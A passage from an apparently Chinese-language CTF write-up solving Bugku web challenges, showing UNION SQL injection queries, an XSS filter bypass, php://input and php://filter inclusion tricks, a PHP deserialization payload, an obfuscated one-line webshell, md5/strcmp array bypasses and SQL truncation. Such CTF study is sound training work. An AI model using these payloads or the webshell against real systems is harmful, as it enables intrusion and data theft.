<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造payload:?kkeyey1=QNKCDZO&amp;kkeyey2=240610708</span><br></pre></td></tr></table></figure>
<h3 id="0x19-成绩单"><a href="#0x19-成绩单" class="headerlink" title="0x19 成绩单"></a>0x19 成绩单</h3><p>爆出所有的数据库名</p>
<p><img src="http://p1vrkwaxt.bkt.clouddn.com/%7D@Q~%5BAH4Y3EBNO94_P%25O%287D.png" alt="image"><br>得到库名skctf_flag<br><br>爆出所有的表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&apos; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure>
<p>得到表名:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fl4g</span><br></pre></td></tr></table></figure></p>
<p>爆出该表名下的所有字段(十六进制绕过)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&apos; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467#</span><br></pre></td></tr></table></figure>
<p>得到字段名:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skctf_flag</span><br></pre></td></tr></table></figure></p>
<p>最后爆出该库名该表名该字段下的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0&apos; union select 1,2,3,skctf_flag from skctf_flag.fl4g#</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BUGKU&#123;Sql_INJECT0N_4813drd8hz4&#125;</span><br></pre></td></tr></table></figure>
<h3 id="0x20-秋名山老司机"><a href="#0x20-秋名山老司机" class="headerlink" title="0x20 秋名山老司机"></a>0x20 秋名山老司机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">亲请在2s内计算老司机的车速是多少</span><br><span class="line"></span><br><span class="line">1921304812-974550581-1618896679+941800639*1148083668-2040820160*2001976067+1660996094*992863445+1871736601-1071212364=?;</span><br></pre></td></tr></table></figure>
<p>很明显地要想在2s内完成就得靠脚本爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url = &apos;http://120.24.86.145:8002/qiumingshan/&apos;</span><br><span class="line">s = requests.Session()</span><br><span class="line">source = s.get(url)</span><br><span class="line">expression = re.search(r&apos;(\d+[+\-*])+(\d+)&apos;, source.text).group()</span><br><span class="line">result = eval(expression)</span><br><span class="line">post = &#123;&apos;value&apos;: result&#125;</span><br><span class="line">print(s.post(url, data = post).text)</span><br></pre></td></tr></table></figure>
<ul>
<li>必须利用会话对象 Session()，否则提交结果的时候，页面又重新生成一个新的表达式，结果自然错误</li>
<li>利用正则表达式截取响应内容中的算术表达式。首先引入 re 模块，其次用 search() 匹配算术表达式，匹配成功后用 group() 返回算术表达式的字符串</li>
</ul>
<h3 id="0x21-速度要快"><a href="#0x21-速度要快" class="headerlink" title="0x21 速度要快"></a>0x21 速度要快</h3><p>与上面原理相同，写个脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = &apos;http://120.24.86.145:8002/web6/&apos;</span><br><span class="line">headers = s.get(url).headers</span><br><span class="line">m = base64.b64decode(base64.b64decode(headers[&apos;flag&apos;]).split(&apos;:&apos;)[1])</span><br><span class="line">data  = &#123;&apos;margin&apos;:m&#125;</span><br><span class="line">print(s.post(url,data=data).text)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KEY&#123;111dd62fcd377076be18a&#125;</span><br></pre></td></tr></table></figure>
<h3 id="0x22-cookie欺骗"><a href="#0x22-cookie欺骗" class="headerlink" title="0x22 cookie欺骗"></a>0x22 cookie欺骗</h3><p>url上的参数明显是base64码，解码后为key.txt<br><br>把参数换成index.php后编码，观察发现line按行返回<br><br>写个脚本跑一下<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">s= requests.Session()</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">url = &apos;http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw&apos;</span><br><span class="line">for i in range(1,30):</span><br><span class="line">        content = s.get(url%i).text</span><br><span class="line">        if content == &quot;&quot;:</span><br><span class="line">                break</span><br><span class="line">        result += content</span><br><span class="line">print result</span><br></pre></td></tr></table></figure></p>
<p>也可以这么写脚本，练了一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">s= requests.Session()</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">url = &apos;http://120.24.86.145:8002/web11/index.php&apos;</span><br><span class="line">for i in range(1,30):</span><br><span class="line">        payload = &#123;&apos;line&apos;:str(i),&apos;filename&apos;:&apos;aW5kZXgucGhw&apos;&#125;</span><br><span class="line">        m = s.get(url,params=payload)</span><br><span class="line">        result += m.text</span><br><span class="line">print result</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">$file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;);</span><br><span class="line">$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0;</span><br><span class="line">if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);</span><br><span class="line">$file_list = array(</span><br><span class="line">&apos;0&apos; =&gt;&apos;keys.txt&apos;,</span><br><span class="line">&apos;1&apos; =&gt;&apos;index.php&apos;,</span><br><span class="line">);</span><br><span class="line"> </span><br><span class="line">if(isset($_COOKIE[&apos;margin&apos;]) &amp;&amp; $_COOKIE[&apos;margin&apos;]==&apos;margin&apos;)&#123;</span><br><span class="line">$file_list[2]=&apos;keys.php&apos;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line">echo $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>说明要求在keys.php下构造Cookie:margin=margin</p>
<ul>
<li>可以用burpsuite抓取传递Cookie</li>
<li>也可以写个脚本传递过去，如下:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">s= requests.Session()</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">url =&apos;http://120.24.86.145:8002/web11/index.php?line=0%d&amp;filename=a2V5cy5waHA=&apos;</span><br><span class="line">cookies = &#123;&apos;margin&apos;:&apos;margin&apos;&#125;</span><br><span class="line">result = s.get(url,cookies=cookies).text</span><br><span class="line">print result</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>跑出如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $key=&apos;KEY&#123;key_keys&#125;&apos;; ?&gt;</span><br></pre></td></tr></table></figure></p>
<h3 id="0x23-xss"><a href="#0x23-xss" class="headerlink" title="0x23 xss"></a>0x23 xss</h3><p><img src="http://p1vrkwaxt.bkt.clouddn.com/1R_M%28G@_M69%25N%5D@%5BG%60_N%2525.png" alt="image"></p>
<p>构造payload:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10089/?id=&lt;img src=1 onerror=alert(_key_)&gt;</span><br></pre></td></tr></table></figure></p>
<p>查看源代码发现&lt;&gt;这被过滤掉了，这里有一篇文章<br><br><a href="http://www.360doc.com/content/16/0308/12/2340477_540447147.shtml" target="_blank" rel="noopener">绕过xss过滤方法</a></p>
<p>所以用尝试构造payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10089/?id=\u003cimg src=1 onerror=alert(_key_)\u003e</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<h3 id="0x23-never-give-up"><a href="#0x23-never-give-up" class="headerlink" title="0x23 never give up"></a>0x23 never give up</h3><p>点开后什么也没有,查看源代码发现 1p.html,复制到url发现莫名跳到<a href="http://www.bugku.com了,猜想里面用了header" target="_blank" rel="noopener">www.bugku.com了,猜想里面用了header</a> location,即:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&apos;Location: http://www.bugku.com/&apos;)</span><br></pre></td></tr></table></figure></p>
<p>于是上burpsuite抓包如图:<br><img src="http://p1vrkwaxt.bkt.clouddn.com/LC2P5AV4XG%28%285S04CW%60CT7D.png" alt="image"></p>
<p>发现var后面有可解码字符,首先url解码，再base64解码，最后url解码得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&quot;if(!$_GET[&apos;id&apos;])</span><br><span class="line">&#123;</span><br><span class="line">	header(&apos;Location: hello.php?id=1&apos;);</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[&apos;id&apos;];</span><br><span class="line">$a=$_GET[&apos;a&apos;];</span><br><span class="line">$b=$_GET[&apos;b&apos;];</span><br><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;no no no no no no no&apos;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;</span><br><span class="line">	require(&quot;f4l2a3g.txt&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	print &quot;never never never give up !!!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>$data==”bugku is a nice plateform!”：可以令a=php://input，然后POST传值 bugku is a nice plateform! 绕过。</li>
<li>strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4：可以利用%00截断，令b=%0012345 绕过。</li>
<li>!$_GET[‘id’]并且id==0：令id=%00或者令id=.都可以绕过<br><img src="http://p1vrkwaxt.bkt.clouddn.com/13.png" alt="image"></li>
</ul>
<h3 id="0x24-welcome-to-bugkuctf"><a href="#0x24-welcome-to-bugkuctf" class="headerlink" title="0x24 welcome to bugkuctf"></a>0x24 welcome to bugkuctf</h3><p>查看源代码得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--    </span><br><span class="line">$user = $_GET[&quot;txt&quot;];    </span><br><span class="line">$file = $_GET[&quot;file&quot;];    </span><br><span class="line">$pass = $_GET[&quot;password&quot;];    </span><br><span class="line">    </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;    </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;    </span><br><span class="line">    include($file); //hint.php    </span><br><span class="line">&#125;else&#123;    </span><br><span class="line">    echo &quot;you are not admin ! &quot;;    </span><br><span class="line">&#125;    </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure></p>
<p>这里user跟上一题类似</p>
<ul>
<li>读取$user文件，内容为welcome to the bugkuctf，</li>
<li>$file要求为hint.php，将其导入<br>这两个分别利用php://input与php://filter<br><br>构造url如下:(看图)<br><img src="http://p1vrkwaxt.bkt.clouddn.com/~KVH$A%5BP%5BT@%29QR%5DIW8B%5D8%7DB.png" alt="image"><br>hint.php经过base64解码后如下:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">class Flag&#123;//flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">			echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		return (&quot;good&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>仔细一看没太大有用信息，便尝试读取index.php源码，方法同上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$txt = $_GET[&quot;txt&quot;];  </span><br><span class="line">$file = $_GET[&quot;file&quot;];  </span><br><span class="line">$password = $_GET[&quot;password&quot;];  </span><br><span class="line">  </span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&apos;r&apos;)===&quot;welcome to the bugkuctf&quot;))&#123;  </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;;  </span><br><span class="line">    if(preg_match(&quot;/flag/&quot;,$file))&#123; </span><br><span class="line">		echo &quot;不能现在就给你flag哦&quot;;</span><br><span class="line">        exit();  </span><br><span class="line">    &#125;else&#123;  </span><br><span class="line">        include($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        echo $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;else&#123;  </span><br><span class="line">    echo &quot;you are not the number of bugku ! &quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>从上面获取的源码可得到如下信息：</p>
<p>1.提示hint.php中提示flag.php,从index.php可以看到对关键词flag进行了屏蔽</p>
<p>2.hint.php中定义了一个类Flag，很有意思的是中间有个 __tostring 方法，这个方法可以理解为将这个类作为字符串执行时会自动执行的一个函数</p>
<p>3.__tostring 方法执行时，将变量$file作为文件名输出文件内容，结合提示flag.php，猜测屏蔽的flag.php文件在此打开</p>
<p>4.在index.php源码中看到了$password的作用</p>
<p>之前说过Flag方法当做字符串执行时，会自动执行 __tostring 方法，注意到echo函数，只能输出一个或多个字符串，所以只要$password为Flag类型数据，且其中string类型的变量$file为flag.php即可</p>
<p>理解到这里，就懂了为啥多一个很奇怪的unserialize函数，其作用即为让你用字符串方式传递一个类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    class Flag&#123;//flag.php    </span><br><span class="line">    public $file;    </span><br><span class="line">    &#125;    </span><br><span class="line">  </span><br><span class="line">    $a = new Flag();  </span><br><span class="line">    $a-&gt;file = &quot;flag.php&quot;;  </span><br><span class="line">    $a = serialize($a);  </span><br><span class="line">    print_r($a);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>得到如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>最后构造的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8006/test1/index.php?txt=php://input&amp;flie=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
<p>post输出welcome to the bugkuctf</p>
<p>查看源代码得到flag</p>
<h3 id="0x25-过狗一句话"><a href="#0x25-过狗一句话" class="headerlink" title="0x25 过狗一句话"></a>0x25 过狗一句话</h3><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%5B_%5BFSF8@9%5DRF10%7BIBJ8T~%602.png" alt="image"><br>整理一下代码得到:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$poc=&quot;a#s#s#e#r#t&quot;;</span><br><span class="line">$poc_1=explode(&quot;#&quot;,$poc);</span><br><span class="line">$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];</span><br><span class="line">$poc_2($_GET[&apos;s&apos;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>仔细研读一下代码，可以发现它这个最终是一句话木马，格式如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php assert($_GET[&apos;s&apos;]) ?&gt;</span><br></pre></td></tr></table></figure></p>
<p>它这个为什么要弄这么复杂呢，百度查了下过狗一句话原理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为了不让狗(安全玩家)看出来这是一句话木马，在一句话木马上增加修饰</span><br></pre></td></tr></table></figure></p>
<p>接下来是正解:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=print_r(scandir(&apos;./&apos;))</span><br></pre></td></tr></table></figure></p>
<p>可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; 2.php [3] =&gt; 3.php [4] =&gt; 4.php [5] =&gt; 5.php [6] =&gt; NewFile.txt [7] =&gt; a.php [8] =&gt; a.txt [9] =&gt; c.php [10] =&gt; conn [11] =&gt; f.html [12] =&gt; f.php [13] =&gt; flag.txt [14] =&gt; h.php [15] =&gt; haha.php [16] =&gt; index.php [17] =&gt; ll.php [18] =&gt; oudeniu.php [19] =&gt; q.php [20] =&gt; shell.php [21] =&gt; t2.php [22] =&gt; testfile.txt [23] =&gt; txxxc.php [24] =&gt; x.php [25] =&gt; zx.php )</span><br></pre></td></tr></table></figure></p>
<p>尝试读取flag.txt得到flag</p>
<ul>
<li>scandir 列出./目录中的文件和目录：</li>
<li>print echo 只能输出字符串<h3 id="0x26-字符？正则？"><a href="#0x26-字符？正则？" class="headerlink" title="0x26 字符？正则？"></a>0x26 字符？正则？</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;2.php&apos;);</span><br><span class="line">$key=&apos;KEY&#123;********************************&#125;&apos;;</span><br><span class="line">$IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);</span><br><span class="line">if( $IM )&#123; </span><br><span class="line">  die(&apos;key is: &apos;.$key);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>很明显的是正则表达式的绕过,这里简单解释下:</p>
<ul>
<li>1.表达式直接写出来的字符串直接利用，如key</li>
<li>2.“.”代表任意字符</li>
<li>3.“*”代表一个或一序列字符重复出现的次数，即前一个字符重复任意次</li>
<li>4.“\/”代表“/”</li>
<li>5.[a-z]代表a-z中的任意一个字符</li>
<li>6.[[:punct:]]代表任意一个字符，包括各种符号</li>
<li>7./i代表大小写不敏感</li>
<li>8.{4-7}代表[0-9]中数字连续出现的次数是4-7次</li>
<li>9.移除字符串两侧的字符,具体格式自行百度<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:8002/web10/?id=keymkeyk555555key:/s/mkeyb@a</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>得到flag</p>
<h3 id="0x27-前女友-SKCTF"><a href="#0x27-前女友-SKCTF" class="headerlink" title="0x27 前女友(SKCTF)"></a>0x27 前女友(SKCTF)</h3><p>查看源代码点链接看到源代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&apos;v1&apos;]) &amp;&amp; isset($_GET[&apos;v2&apos;]) &amp;&amp; isset($_GET[&apos;v3&apos;]))&#123;</span><br><span class="line">    $v1 = $_GET[&apos;v1&apos;];</span><br><span class="line">    $v2 = $_GET[&apos;v2&apos;];</span><br><span class="line">    $v3 = $_GET[&apos;v3&apos;];</span><br><span class="line">    if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        if(!strcmp($v3, $flag))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>这里主要利用两个漏洞</p>
<ul>
<li>md5()函数漏洞</li>
<li>strcmp()函数漏洞<br>这两个都无法识别数组从而返回0<br><br>最终构造payload:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.89.219.210:49162/?v1[]=1&amp;v2[]=2&amp;v3[]=1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x28-login1-SKCTF"><a href="#0x28-login1-SKCTF" class="headerlink" title="0x28 login1(SKCTF)"></a>0x28 login1(SKCTF)</h3><p>原理:SQL约束攻击<br><br>这个不解释了，具体内容我博客有，也可以自行百度<br></p>
<ul>
<li>首先注册admin发现admin已经存在了，猜测是对admin进行SQL约束攻击<br>用户名注册为如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin                                                                                              1</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>空格符尽量多一点，因为mysql数据库当数据在超过一定长度的时候会自动截断。<br><br>密码随意.<br><br>发现注册成功，然后再登陆得到flag.</p>
<h3 id="0x29-你从哪里来"><a href="#0x29-你从哪里来" class="headerlink" title="0x29 你从哪里来"></a>0x29 你从哪里来</h3><p>原理:referer消息头<br><br>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。<br><br>按F12或者抓包增加一条信息:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:https://www.google.com</span><br></pre></td></tr></table></figure></p>
<p>得到flag</p>
<h3 id="0x30-md5-collision-NUPT-CTF"><a href="#0x30-md5-collision-NUPT-CTF" class="headerlink" title="0x30 md5 collision(NUPT_CTF)"></a>0x30 md5 collision(NUPT_CTF)</h3><p>原理:md5碰撞<br><br>百度的一个简单解释是:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5简单说是文件的指纹识别； 不同文件的md5码是不一样的；也有人研究这个算法的，找到两个不同文件但是md5一样的，这就是md5碰撞，几率很小。这是个不可逆算法</span><br></pre></td></tr></table></figure></p>
<p>在这里的是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在php文件中，以MD5值以0e开头的话，php就会认为他们两个的值相等.</span><br></pre></td></tr></table></figure></p>
<p>也就是说，在这里输入a，这个a的md5值要以0e开头.<br><br>这里给出以0e开头的一些md5值<br><br><a href="http://www.219.me/posts/2884.html" target="_blank" rel="noopener">http://www.219.me/posts/2884.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9009/md5.php?a=s214587387a</span><br></pre></td></tr></table></figure></p>
<h3 id="0x31-各种绕过"><a href="#0x31-各种绕过" class="headerlink" title="0x31 各种绕过"></a>0x31 各种绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">highlight_file(&apos;flag.php&apos;); </span><br><span class="line">$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]); </span><br><span class="line">$flag = &apos;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&apos;; </span><br><span class="line">if (isset($_GET[&apos;uname&apos;]) and isset($_POST[&apos;passwd&apos;])) &#123; </span><br><span class="line">    if ($_GET[&apos;uname&apos;] == $_POST[&apos;passwd&apos;]) </span><br><span class="line"></span><br><span class="line">        print &apos;passwd can not be uname.&apos;; </span><br><span class="line"></span><br><span class="line">    else if (sha1($_GET[&apos;uname&apos;]) === sha1($_POST[&apos;passwd&apos;])&amp;($_GET[&apos;id&apos;]==&apos;margin&apos;)) </span><br><span class="line"></span><br><span class="line">        die(&apos;Flag: &apos;.$flag); </span><br><span class="line"></span><br><span class="line">    else </span><br><span class="line"></span><br><span class="line">        print &apos;sorry!&apos;; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
